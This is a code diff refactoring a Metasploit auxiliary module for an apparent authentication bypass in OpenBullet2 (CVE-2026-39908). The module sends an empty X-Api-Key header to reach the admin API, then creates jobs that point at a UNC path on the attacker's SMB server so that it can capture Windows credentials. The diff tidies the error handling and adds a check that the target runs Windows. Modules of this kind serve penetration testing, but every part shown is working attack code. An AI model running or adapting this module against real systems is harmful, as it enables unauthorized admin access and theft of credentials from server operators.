@@ -4,6 +4,8 @@
 ##
 
 class MetasploitModule < Msf::Auxiliary
+  Rank = ExcellentRanking
+
   include Msf::Exploit::Remote::HttpClient
   include Msf::Exploit::FILEFORMAT
   include Msf::Exploit::Remote::SMB::Server::Share
@@ -32,7 +34,7 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2026-39908'],
           ['URL', 'https://hackernoon.com/one-empty-header-to-admin-how-an-auth-bypass-breaks-openbullet2']
         ],
-        'DisclosureDate' => '2026-06-04',
+        'DisclosureDate' => '2026-06-08',
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'SideEffects' => [IOC_IN_LOGS],
@@ -54,29 +56,20 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'headers' => { 'X-Api-Key' => '' }
     )
+    return Exploit::CheckCode::Unknown("#{peer} - Server did not respond with the expected HTTP 200") unless res&.code == 200
 
-    Exploit::CheckCode::Safe('The server returned 401 status code, the version is not vulnerable')
-
-    json_body = res.get_json_document
-    unless json_body
-      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
-    end
-
-    unless json_body.key?('currentVersion')
-      fail_with(Failure::UnexpectedReply, "#{peer} - currentVersion key not found in response")
-    end
+    json_body = res&.get_json_document
+    return Exploit::CheckCode::Unknown("#{peer} - Unable to parse JSON response") unless json_body
+    return Exploit::CheckCode::Unknown("#{peer} - \"currentVersion\" key not found in response") unless json_body.key?('currentVersion')
 
     version = Rex::Version.new(json_body['currentVersion'])
-    if version >= Rex::Version.new('0.2.5')
-      server_info = get_server_info
-      target_os = server_info['operatingSystem']
-      print_status("OpenBullet2 Instance OS: #{target_os}")
+    return Exploit::CheckCode::Safe("Detected version #{version}, which is not vulnerable") if version < Rex::Version.new('0.2.5')
 
-      Exploit::CheckCode::Detected("Detected version #{version}, which is vulnerable. But you can't use module, because it only for windows.") if target_os !~ /windows/i
-      return Exploit::CheckCode::Appears("Detected version #{version}, which is vulnerable")
-    end
+    @target_os = get_server_info
+    print_status("OpenBullet2 Instance OS: #{@target_os}")
+    return Exploit::CheckCode::Safe("Detected vulnerable version #{version}, but the target OS is #{@target_os} (Windows-only module)") unless @target_os.to_s.downcase.include?('windows')
 
-    Exploit::CheckCode::Safe("Detected version #{version}, which is not vulnerable")
+    Exploit::CheckCode::Appears("Detected vulnerable version #{version} (#{@target_os})")
   end
 
   def create_config
@@ -85,19 +78,11 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'POST',
       'headers' => { 'X-Api-Key' => '' }
     )
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
 
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
-
-    json_body = res.get_json_document
-    unless json_body
-      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
-    end
-
-    unless json_body.key?('id')
-      fail_with(Failure::UnexpectedReply, "#{peer} - id key not found in response")
-    end
+    json_body = res&.get_json_document
+    fail_with(Failure::UnexpectedReply, 'Unable to parse the response') unless json_body
+    fail_with(Failure::UnexpectedReply, "#{peer} - id key not found in response") unless json_body.key?('id')
 
     json_body['id']
   end
@@ -108,11 +93,10 @@ class MetasploitModule < Msf::Auxiliary
       'method' => 'GET',
       'headers' => { 'X-Api-Key' => '' }
     )
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
 
-    json_body = res.get_json_document
-    unless json_body
-      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
-    end
+    json_body = res&.get_json_document
+    fail_with(Failure::UnexpectedReply, 'Unable to parse the response') unless json_body
 
     json_body
   end
@@ -145,19 +129,11 @@ class MetasploitModule < Msf::Auxiliary
         ]
       }.to_json
     )
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
 
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
-
-    json_body = res.get_json_document
-    unless json_body
-      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
-    end
-
-    unless json_body.key?('id')
-      fail_with(Failure::UnexpectedReply, "#{peer} - id key not found in response")
-    end
+    json_body = res&.get_json_document
+    fail_with(Failure::UnexpectedReply, 'Unable to parse the response') unless json_body
+    fail_with(Failure::UnexpectedReply, "#{peer} - id key not found in response") unless json_body.key?('id')
 
     json_body['id']
   end
@@ -170,10 +146,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'data' => { 'jobId' => job_id, 'wait' => false }.to_json
     )
-
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
   end
 
   def abort_job(job_id)
@@ -184,10 +157,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'data' => { 'jobId' => job_id, 'wait' => false }.to_json
     )
-
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
   end
 
   def delete_job(job_id)
@@ -198,10 +168,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'vars_get' => { id: job_id }
     )
-
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
   end
 
   def delete_config(config_id)
@@ -212,10 +179,7 @@ class MetasploitModule < Msf::Auxiliary
       'ctype' => 'application/json',
       'vars_get' => { id: config_id }
     )
-
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
   end
 
   def get_server_info
@@ -225,42 +189,38 @@ class MetasploitModule < Msf::Auxiliary
       'headers' => { 'X-Api-Key' => '' },
       'ctype' => 'application/json'
     )
+    fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200") unless res&.code == 200
 
-    unless res && res.code == 200
-      fail_with(Failure::UnexpectedReply, "#{peer} Server did not respond with the expected HTTP 200")
-    end
+    json_body = res&.get_json_document
+    fail_with(Failure::UnexpectedReply, 'Unable to parse the response') unless json_body
+    fail_with(Failure::UnexpectedReply, "#{peer} - operatingSystem key not found in response") unless json_body.key?('operatingSystem')
 
-    json_body = res.get_json_document
-    unless json_body
-      fail_with(Failure::UnexpectedReply, 'Unable to parse the response')
-    end
-
-    unless json_body.key?('operatingSystem')
-      fail_with(Failure::UnexpectedReply, "#{peer} - operatingSystem key not found in response")
-    end
-
-    json_body
+    json_body['operatingSystem']
   end
 
   def cleanup
     super
     delete_config(@config_id) if @config_source == :created
-    abort_job(@job_id)
-    delete_job(@job_id) if !@job_id.nil?
+    abort_job(@job_id) if @job_id
+    delete_job(@job_id) if @job_id
+  end
+
+  def validate_target_os!
+    target_os = @target_os || get_server_info
+    unless target_os.to_s.downcase.include?('windows')
+      fail_with(Failure::NoTarget, "This module only supports Windows targets, but the remote server is running #{target_os}.")
+    end
   end
 
   def run
+    validate_target_os!
+
     configs = get_configs
-    @config_id, @config_source =
-      if configs.empty?
-        [create_config, :created]
-      else
-        [configs.sample['id'], :default]
-      end
+    @config_id, @config_source = configs.empty? ? [create_config, :created] : [configs.sample['id'], :default]
 
     unc_share = Faker::Lorem.word
     unc_fname = Faker::Lorem.word
-    unc_path = "\\\\#{srvhost}\\\\#{unc_share}\\\\#{unc_fname}.txt"
+    unc_path = "\\\\#{srvhost}\\#{unc_share}\\#{unc_fname}.txt"
     @job_id = create_job(@config_id, unc_path)
 
     start_smb_capture_server
